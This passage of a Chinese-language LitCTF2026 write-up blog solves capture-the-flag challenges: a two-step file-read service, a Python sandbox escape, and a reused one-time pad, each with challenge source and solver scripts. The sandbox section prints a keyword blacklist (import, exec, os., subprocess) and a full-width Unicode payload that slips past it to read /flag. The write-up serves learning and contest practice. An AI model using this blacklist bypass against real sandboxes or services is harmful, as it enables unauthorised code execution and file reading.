+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">conn.sendall(<span class="string">b&quot;\n--- end ---\nFile path (2/2): &quot;</span>)</span><br><span class="line">p2 = recv_line(conn)</span><br><span class="line">c2 = safe_read(p2)</span><br><span class="line">conn.sendall(c2.encode(errors=<span class="string">&quot;replace&quot;</span>))</span><br></pre></td></tr></table></figure></div>
+
+<p>逻辑：程序紧接着要求输入第二个文件路径。</p>
+<p>要求：此时输入刚刚在第一步里看到的那个真正的 Flag 路径。</p>
+<p>结果：程序读取并输出真正的 Flag 内容，随后关闭连接。</p>
+<p>根据分析，需要编写一个简单的 Python 脚本，利用自带的 <code>socket</code> 库去连接题目环境，  </p>
+<p>接收系统给出的 8 位随机字符串。</p>
+<p>将其反转并发送回去。</p>
+<p>当系统提示 <code>File path (1/2):</code> 时，发送 <code>/app/where_is_flag.txt</code>。</p>
+<p>从返回的内容中提取出真正的 Flag 路径。</p>
+<p>当系统提示 <code>File path (2/2):</code> 时，发送刚刚提取出的新路径。</p>
+<p>打印出最后的输出，即可拿到 Flag。</p>
+<p>exp</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;challenge.cyclens.tech&#x27;</span></span><br><span class="line">PORT = <span class="number">31117</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_all</span>(<span class="params">s, timeout=<span class="number">5</span></span>):</span><br><span class="line">    s.settimeout(timeout)</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            chunk = s.recv(<span class="number">4096</span>).decode()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += chunk</span><br><span class="line">        <span class="keyword">except</span> socket.timeout:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">    s.connect((HOST, PORT))</span><br><span class="line">    data = recv_all(s)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Received 1:&#x27;</span>, <span class="built_in">repr</span>(data))</span><br><span class="line">    </span><br><span class="line">    challenge = data.split(<span class="string">&quot;&#x27;&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    ans = challenge[::-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Sending reverse:&#x27;</span>, ans)</span><br><span class="line">    s.sendall((ans + <span class="string">&#x27;\n&#x27;</span>).encode())</span><br><span class="line">    </span><br><span class="line">    data = recv_all(s)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Received 2:&#x27;</span>, <span class="built_in">repr</span>(data))</span><br><span class="line">    </span><br><span class="line">    s.sendall(<span class="string">b&#x27;/app/where_is_flag.txt\n&#x27;</span>)</span><br><span class="line">    data = recv_all(s)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Received 3:&#x27;</span>, <span class="built_in">repr</span>(data))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;--- begin ---&#x27;</span> <span class="keyword">in</span> data <span class="keyword">and</span> <span class="string">&#x27;--- end ---&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        content = data.split(<span class="string">&#x27;--- begin ---&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;--- end ---&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Flag path:&#x27;</span>, content)</span><br><span class="line">        </span><br><span class="line">        s.sendall((content + <span class="string">&#x27;\n&#x27;</span>).encode())</span><br><span class="line">        data = recv_all(s)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Final result:&#x27;</span>, <span class="built_in">repr</span>(data))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Error: could not find flag path&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251311870.png"
+                      alt="img"
+                ></p>
+<p>flag：flag{wlot52el-ya2x-4au-8gti-idnaozvlhamdi}</p>
+<h2 id="LitCTF2026-lit-pyjail-unicode"><a href="#LitCTF2026-lit-pyjail-unicode" class="headerlink" title="[LitCTF2026] lit_pyjail_unicode"></a>[LitCTF2026] lit_pyjail_unicode</h2><p>题目附件</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;LitCTF — Unicode 标识符绕过：过滤检查原始源码字符串，解释器仍接受全角等价标识符。&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">PORT = <span class="number">9999</span></span><br><span class="line">MAX_QUEUED = <span class="number">64</span></span><br><span class="line">MAX_LINE = <span class="number">240</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 仅检查「你键入的文本」：ASCII 关键字用词边界，避免匹配到 important 等</span></span><br><span class="line">BANNED = re.<span class="built_in">compile</span>(</span><br><span class="line">    <span class="string">r&quot;\bimport\b|\bexec\b|\beval\b|\bopen\b|\bcompile\b|\bglobals\b|\blocals\b|__|&quot;</span></span><br><span class="line">    <span class="string">r&quot;\bgetattr\b|\bsetattr\b|\bdelattr\b|\bvars\b|\bbreakpoint\b|\binput\b|&quot;</span></span><br><span class="line">    <span class="string">r&quot;\bsubprocess\b|\bpty\b|os\.|sys\.|\bposix\b&quot;</span>,</span><br><span class="line">    re.IGNORECASE,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banned</span>(<span class="params">raw: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;\\u&quot;</span> <span class="keyword">in</span> raw <span class="keyword">or</span> <span class="string">&quot;\\U&quot;</span> <span class="keyword">in</span> raw <span class="keyword">or</span> <span class="string">&quot;\\x&quot;</span> <span class="keyword">in</span> raw:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> BANNED.search(raw) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">conn: socket.socket</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn.settimeout(<span class="number">60</span>)</span><br><span class="line">        conn.sendall(</span><br><span class="line">            <span class="string">b&quot;=== LitCTF pyjail unicode ===\n&quot;</span></span><br><span class="line">            <span class="string">b&quot;Send ONE line of Python. It will be eval() with full __builtins__.\n&quot;</span></span><br><span class="line">            <span class="string">b&quot;ASCII blacklist applies to your *source text* (see attachment jail.py).\n&quot;</span></span><br><span class="line">            <span class="string">b&quot;Goal: read /flag and get its str content.\n&gt; &quot;</span></span><br><span class="line">        )</span><br><span class="line">        raw = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(raw) &lt; MAX_LINE:</span><br><span class="line">            ch = conn.recv(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> ch:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="string">b&quot;\n&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            raw += ch</span><br><span class="line">        line = raw.decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;replace&quot;</span>).strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">            conn.sendall(<span class="string">b&quot;empty\n&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> banned(line):</span><br><span class="line">            conn.sendall(<span class="string">b&quot;disallowed pattern in source\n&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            out = <span class="built_in">eval</span>(line, &#123;<span class="string">&quot;__builtins__&quot;</span>: __builtins__&#125;)</span><br><span class="line">            conn.sendall(<span class="built_in">repr</span>(out).encode(errors=<span class="string">&quot;replace&quot;</span>) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            conn.sendall(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>: <span class="subst">&#123;e&#125;</span>\n&quot;</span>.encode(errors=<span class="string">&quot;replace&quot;</span>))</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    srv.bind((HOST, PORT))</span><br><span class="line">    srv.listen(MAX_QUEUED)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        c, _ = srv.accept()</span><br><span class="line">        threading.Thread(target=handle, args=(c,), daemon=<span class="literal">True</span>).start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
+
+<p> 这段代码是一个典型的 Python 沙箱逃逸（PyJail）题目后端服务。它的核心逻辑是：启动一个网络服务，接收用户输入的一行 Python 代码，在通过严格的黑名单过滤后，使用 <code>eval()</code> 执行这行代码。  </p>
+<p> 代码的注释给出了提示 Unicode 标识符绕过 。</p>
+<p>代码中给出的黑名单</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BANNED = re.<span class="built_in">compile</span>(</span><br><span class="line">    <span class="string">r&quot;\bimport\b|\bexec\b|\beval\b|\bopen\b|\bcompile\b|\bglobals\b|\blocals\b|__|&quot;</span></span><br><span class="line">    <span class="string">r&quot;\bgetattr\b|\bsetattr\b|\bdelattr\b|\bvars\b|\bbreakpoint\b|\binput\b|&quot;</span></span><br><span class="line">    <span class="string">r&quot;\bsubprocess\b|\bpty\b|os\.|sys\.|\bposix\b&quot;</span>,</span><br><span class="line">    re.IGNORECASE,</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
+
+<p>拦截的内容包括：</p>
+<ol>
+<li>危险内置函数：<code>eval</code>, <code>exec</code>, <code>open</code>, <code>compile</code>, <code>getattr</code> 等（防止你直接读文件或执行任意代码）。</li>
+<li>模块与机制：<code>import</code>, <code>os.</code>, <code>sys.</code>, <code>subprocess</code> 等（防止你加载系统模块执行系统命令）。</li>
+<li>特殊双下划线：<code>__</code>（防止你利用 Python 魔法属性进行黑客常见的「沙箱逃逸」，比如 <code>__class__</code>、<code>__builtins__</code>）。</li>
+<li>编码转义：在 <code>banned</code> 函数中，还拦截了 <code>\u</code>, <code>\U</code>, <code>\x</code>。这意味着你不能通过 <code>&#39;\x5f\x5f&#39;</code> 这样的十六进制或 Unicode 转义字符串来拼凑出 <code>__</code>。</li>
+</ol>
+<p>当选手连接成功后：</p>
+<ol>
+<li>服务器限制最多读取 240 个字节（<code>MAX_LINE</code>），且遇到换行符 <code>\n</code> 就结束读取。</li>
+<li>使用 <code>raw.decode(&quot;utf-8&quot;)</code> 将获取到的字节流解码为字符串。</li>
+<li>触发防御检查：调用 <code>banned(line)</code>，如果命中了上面的黑名单，直接返回 <code>disallowed pattern in source</code> 并断开连接。</li>
+<li>沙箱执行：如果没命中黑名单，则调用 <code>eval(line, &#123;&quot;__builtins__&quot;: __builtins__&#125;)</code> 执行代码，并将结果返回给选手。</li>
+</ol>
+<p>虽然作者写了非常严格的 ASCII 黑名单，并且封杀了 <code>\u</code> 这种转义写法，但这里存在一个逻辑悖论：题目过滤的是源码字符串，但 Python 解释器在执行前会对标识符做规范化处理。</p>
+<p>Python解释器在解析源代码时，会对标识符进行NFKC归一化处理，将全角字符转换为对应的半角字符。这是Python官方规范的一部分，目的是支持Unicode标识符。</p>
+<p>目标是读取 &#x2F;flag 文件的内容。正常情况下需要：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure></div>
+
+<p>但 open 和 read 都在黑名单中。</p>
+<p>关键字替换为全角字符：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- <span class="built_in">open</span> → ｏｐｅｎ （全角）</span><br><span class="line">- read → ｒｅａｄ （全角）</span><br></pre></td></tr></table></figure></div>
+
+<p>最终payload</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ｏｐｅｎ(<span class="string">&#x27;/flag&#x27;</span>).ｒｅａｄ()</span><br></pre></td></tr></table></figure></div>
+
+<p>全角字符的Unicode码点范围是 U+FF01 到 U+FF5E ，对应ASCII字符的全角形式。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251311241.png"
+                      alt="img"
+                ></p>
+<p>向服务器发送payload收取响应</p>
+<p>exp</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全角字符：ｏｐｅｎ 和 ｒｅａｄ</span></span><br><span class="line"><span class="comment"># ｏ = U+FF4F, ｐ = U+FF50, ｅ = U+FF45, ｎ = U+FF4E</span></span><br><span class="line"><span class="comment"># ｒ = U+FF52, ａ = U+FF41, ｄ = U+FF44</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;\uff4f\uff50\uff45\uff4e(&#x27;/flag&#x27;).\uff52\uff45\uff41\uff44()\n&quot;</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;challenge.cyclens.tech&quot;</span>, <span class="number">31731</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收欢迎信息</span></span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload</span></span><br><span class="line">s.sendall(payload.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收结果</span></span><br><span class="line">result = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Result:&quot;</span>, result.decode())</span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251312249.png"
+                      alt="img"
+                ></p>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="LitCTF2026-lit-xor-two-story"><a href="#LitCTF2026-lit-xor-two-story" class="headerlink" title="[LitCTF2026] lit_xor_two_story"></a>[LitCTF2026] lit_xor_two_story</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">LitCTF2026 — One-time pad reused for two messages (40 bytes each).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Players receive output.txt and README; they do not receive secret.py.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> secret <span class="keyword">import</span> M1_FLAG</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(</span><br><span class="line">        <span class="string">&quot;secret.py (organizer) is required to generate ciphertext; &quot;</span></span><br><span class="line">        <span class="string">&quot;players work from output.txt only.&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="comment"># Public second message — duplicated in README for contestants.</span></span><br><span class="line">M2_KNOWN = <span class="string">b&quot;litctf2026_xor_keystream_reuse_40bytes!!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(M1_FLAG) == <span class="built_in">len</span>(M2_KNOWN) == <span class="number">40</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_bytes</span>(<span class="params">a: <span class="built_in">bytes</span>, b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--write&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=Path,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;Write hex lines to file.&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    n = <span class="built_in">len</span>(M1_FLAG)</span><br><span class="line">    k = os.urandom(n)</span><br><span class="line">    c1 = xor_bytes(M1_FLAG, k)</span><br><span class="line">    c2 = xor_bytes(M2_KNOWN, k)</span><br><span class="line"></span><br><span class="line">    lines = [</span><br><span class="line">        <span class="string">f&quot;c1 = <span class="subst">&#123;c1.<span class="built_in">hex</span>()&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">f&quot;c2 = <span class="subst">&#123;c2.<span class="built_in">hex</span>()&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">f&quot;len = <span class="subst">&#123;n&#125;</span>&quot;</span>,</span><br><span class="line">    ]</span><br><span class="line">    text = <span class="string">&quot;\n&quot;</span>.join(lines) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(text, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> args.write:</span><br><span class="line">        args.write.write_text(text, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># c1 = 5f70a847ce12759e156e3cad1aa9530a119386a02ffc1c31bf14ab7a0a82ccc108f8476f75c98a28</span></span><br><span class="line"><span class="comment"># c2 = 5f70a847ce123cc153283ca710ae7f042b8490a238eb2228970fad6a2694f2985dc5557e69e5f474</span></span><br><span class="line"><span class="comment"># len = 40</span></span><br></pre></td></tr></table></figure></div>
+
+<p>是 One-Time Pad（一次性密码本）重复使用漏洞。</p>
+<p>因为：</p>
+<ul>
+<li><code>c1 = M1_FLAG XOR k</code></li>
+<li><code>c2 = M2_KNOWN XOR k</code></li>
+</ul>
+<p>同一个 <code>k</code> 被重复用了，所以：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251309095.png"
+                      alt="img"
+                ></p>
+<p>而 <code>M2</code> 已知，因此：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251309252.png"
+                      alt="img"
+                ></p>
+<p>这里的核心公式：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251309906.png"
+                      alt="img"
+                ></p>
+<p> 先把数据转成 bytes, 然后直接异或恢复： </p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c1 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;5f70a847ce12759e156e3cad1aa9530a119386a02ffc1c31bf14ab7a0a82ccc108f8476f75c98a28&quot;</span>)</span><br><span class="line">c2 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;5f70a847ce123cc153283ca710ae7f042b8490a238eb2228970fad6a2694f2985dc5557e69e5f474&quot;</span>)</span><br><span class="line"></span><br><span class="line">m2 = <span class="string">b&quot;litctf2026_xor_keystream_reuse_40bytes!!&quot;</span></span><br><span class="line">flag = <span class="built_in">bytes</span>(a ^ b ^ c <span class="keyword">for</span> a, b, c <span class="keyword">in</span> <span class="built_in">zip</span>(c1, c2, m2))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251312626.png"
+                      alt="img"
+                ></p>
+<h2 id="LitCTF2026-lit-elgamal-handshake"><a href="#LitCTF2026-lit-elgamal-handshake" class="headerlink" title="[LitCTF2026] lit_elgamal_handshake"></a>[LitCTF2026] lit_elgamal_handshake</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 